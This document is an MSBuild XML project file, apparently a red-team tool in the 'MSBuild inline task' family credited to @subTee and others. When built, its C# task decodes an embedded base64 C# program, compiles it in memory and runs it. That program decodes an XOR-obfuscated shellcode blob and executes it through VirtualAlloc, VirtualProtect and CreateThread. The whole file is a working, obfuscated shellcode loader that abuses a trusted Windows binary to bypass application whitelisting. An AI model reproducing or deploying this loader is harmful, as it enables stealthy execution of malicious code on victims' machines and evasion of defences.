<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
  <!-- Created C# payload: Franci Sacer, Twitter: @francisacer1 -->
  <!-- License: BSD 3-Clause -->
  <Target Name="npscsharp">
   <nps />
  </Target>
  <UsingTask
    TaskName="nps"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Collections.Generic;
        using System.Linq;
        using System.Text;
        using System.Runtime.InteropServices;
        using System.Collections.ObjectModel;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        using Microsoft.CSharp;
        using System.CodeDom.Compiler;
        using System.Reflection;

        public class nps : Task, ITask
        {
            public override bool Execute()
            {
                Console.WriteLine("hey");
                string cmd = "CnVzaW5nIFN5c3RlbS5UZXh0Owp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIENsYXNzRXhhbXBsZQp7CiAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgTUVNX0NPTU1JVCA9IDB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBQQUdFX1JFQURXUklURSA9IDB4MDQ7CiAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgUEFHRV9FWEVDVVRFX1JFQUQgPSAweDIwOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBVSW50MzIgVmlydHVhbEFsbG9jKFVJbnQzMiBscFN0YXJ0QWRkciwgVUludDMyIHNpemUsIFVJbnQzMiBmbEFsbG9jYXRpb25UeXBlLCBVSW50MzIgZmxQcm90ZWN0KTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgYWRkcmVzcywgVUludDMyIHNpemUsIFVJbnQzMiBuZXdQcm90ZWN0LCBvdXQgVUludDMyIG9sZFByb3RlY3QpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKAogICAgICAgIFVJbnQzMiBscFRocmVhZEF0dHJpYnV0ZXMsCiAgICAgICAgVUludDMyIGR3U3RhY2tTaXplLAogICAgICAgIFVJbnQzMiBscFN0YXJ0QWRkcmVzcywKICAgICAgICBJbnRQdHIgcGFyYW0sCiAgICAgICAgVUludDMyIGR3Q3JlYXRpb25GbGFncywKICAgICAgICByZWYgVUludDMyIGxwVGhyZWFkSWQKICAgICk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBXYWl0Rm9yU2luZ2xlT2JqZWN0KEludFB0ciBoSGFuZGxlLCBVSW50MzIgZHdNaWxsaXNlY29uZHMpOwogICAgcHVibGljIHZvaWQgRXhlY3V0ZSgpIHsKICAgICAgICBzdHJpbmcgcmF3ID0gQCJhQ01lT2lBdENCVVBLendORERSN0pSQkhja2N1WFQ0MENGMEFBVDlSR3c0RllGMEZNeHg3SHpVb0R4RUhMUUFuSHk4YU1RVUdjUVpOQUhsakVWZ0RLaVFsUFI4R0t5WXNCQTlUSkNvM2UySVNOUU1qS0MwQkFEOVNPVGgxTFVrRUVBeGdmQVlJTGdGT1dqTVdMQlZpSXprdFV5a2RFR3AwSVFvUVRnYy9HMlZqSkRzdEZoUm9ERWxFVW53REtRSTFOaTQrRm1aV0lTUW9JSEVmRUNOaVd3MHFBeHM0T2lVMUF3UjlCaGxtQUM4UURuOUNMVHBHRmdNQkgyUVhKVHBTSUFBTVBpOHhXMzBqRlM0eFRsVWNMR1JUSERVVVpuY2FUeklIY1FZdE5UY0RYemtrTkNVcUNRMHRiRHMwTlhKZkVWNGJERHNyY0djMUd4QXVGeFI0ZkRVY2RnY09LaVVBQURzYk9EUU1BeGNQTGcwNU5nOXhTU01HR0FFc1AzMGpIVEVRRWlBQVRTSXdNMWRjSGw0RER5QXJMbUlBREQ4UGJtNXZHaXhFWEhRU1hUa1dGQnNNRlJjdE9GUUFGbmdQTlVkOWZCNDZMVFFzT2lGaUdEVUVJd3hsYzNndUdHVllJaXRHVEFJQkxXY0FVeHdtSURsM0RTb2djWElqQVNVV0JEa1BOVEpSQUJBbEFHODhLek5VU0JJNUEwa3lQM2dHTkZBbU9CVm1XalF1R2xkekV4WWZPeklvSW1BRkR5SVpGZ0pCSFNveEJrWWtCamxNQXdJdExRQTNOaHNrRVZaK0l6RjFhaDVmR3g4ek94c0JCQ1lJT3lRQWNIODRNSEZmRVZnYUh4a2FaZ0kvQVFnMUlCWjROMDAvWVdRU1hUa2hORjBUTzJCVEJ4UU9lQllZRlJ0Y2V4OWVIamdzR3dnVlB3Y1FFQU1SZXo4eFIybGZJemtXSEFrYVpnSURVeHcxRkdaaklUVW5hbWtpUTFndkNROExaUkFsT3lnRUlIZ1BHRE5uUndrSk0xWlFPWEJsTEFjNktnQVdlQThZSFhGZkJpNDJPQ0FyTGhVWEp4TWdGR1ZSRndrd1kxeG9WU0F0TkYwR0htTlROZzRBRkhnUE9EQjlaeVl1UEM0SUNRVjdaenNLSUNVYUVnSTdBWHQwTHc4MVNGUTZJeEFPU1RvVGJuZ1dZVFFpVkVVS09Eb09MUVlBTFJnYlpoZ01NSHA1UVRwa1dSRUJHRGcwUTJZQyI7CiAgICAgICAgYnl0ZVtdIHNoZWxsY29kZSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyh4b3JJdCgiR2x3eWFsSVRWYlJhQVc5Tnl2MzAiLCBCYXNlNjREZWNvZGUocmF3KSkpOwogICAgICAgIFVJbnQzMiBmdW5jQWRkciA9IFZpcnR1YWxBbGxvYygwLCAoVUludDMyKXNoZWxsY29kZS5MZW5ndGgsIE1FTV9DT01NSVQsIFBBR0VfUkVBRFdSSVRFKTsKICAgICAgICBNYXJzaGFsLkNvcHkoc2hlbGxjb2RlLCAwLCAoSW50UHRyKShmdW5jQWRkciksIHNoZWxsY29kZS5MZW5ndGgpOwogICAgICAgIFVJbnQzMiBvbGRQcm90ZWN0OwogICAgICAgIFZpcnR1YWxQcm90ZWN0KChJbnRQdHIpKGZ1bmNBZGRyKSwgKFVJbnQzMilzaGVsbGNvZGUuTGVuZ3RoLCBQQUdFX0VYRUNVVEVfUkVBRCwgb3V0IG9sZFByb3RlY3QpOwogICAgICAgIEludFB0ciBoVGhyZWFkID0gSW50UHRyLlplcm87CiAgICAgICAgVUludDMyIHRocmVhZElkID0gMDsKICAgICAgICBJbnRQdHIgcGluZm8gPSBJbnRQdHIuWmVybzsKICAgICAgICBoVGhyZWFkID0gQ3JlYXRlVGhyZWFkKDAsIDAsIGZ1bmNBZGRyLCBwaW5mbywgMCwgcmVmIHRocmVhZElkKTsKICAgICAgICBXYWl0Rm9yU2luZ2xlT2JqZWN0KGhUaHJlYWQsIDB4RkZGRkZGRkYpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIHhvckl0KHN0cmluZyBrZXksIHN0cmluZyBpbnB1dCkKICAgIHsKICAgICAgICBTdHJpbmdCdWlsZGVyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIoKTsKICAgICAgICBmb3IoaW50IGk9MDsgaSA8IGlucHV0Lkxlbmd0aDsgaSsrKQogICAgICAgICAgICBzYi5BcHBlbmQoKGNoYXIpKGlucHV0W2ldIF4ga2V5WyhpICUga2V5Lkxlbmd0aCldKSk7CiAgICAgICAgU3RyaW5nIHJlc3VsdCA9IHNiLlRvU3RyaW5nKCk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBCYXNlNjRFbmNvZGUoc3RyaW5nIHRleHQpIHsKICAgICAgIHJldHVybiBTeXN0ZW0uQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhTeXN0ZW0uVGV4dC5FbmNvZGluZy5VVEY4LkdldEJ5dGVzKHRleHQpKTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBCYXNlNjREZWNvZGUoc3RyaW5nIGVuY29kZWR0ZXh0KSB7CgkgICAgcmV0dXJuIFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoZW5jb2RlZHRleHQpKTsKICAgIH0KfQ==";
                CSharpCodeProvider nps = new CSharpCodeProvider();
                CompilerParameters parameters = new CompilerParameters();
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
                parameters.GenerateExecutable = false;
                parameters.GenerateInMemory = true;
                parameters.IncludeDebugInformation = false;
                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
                Assembly assembly = results.CompiledAssembly;
                object obj = assembly.CreateInstance("ClassExample");
                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
                return true;
            }

            public static string Base64Encode(string text) {
               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
            }

            public static string Base64Decode(string encodedtext) {
                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
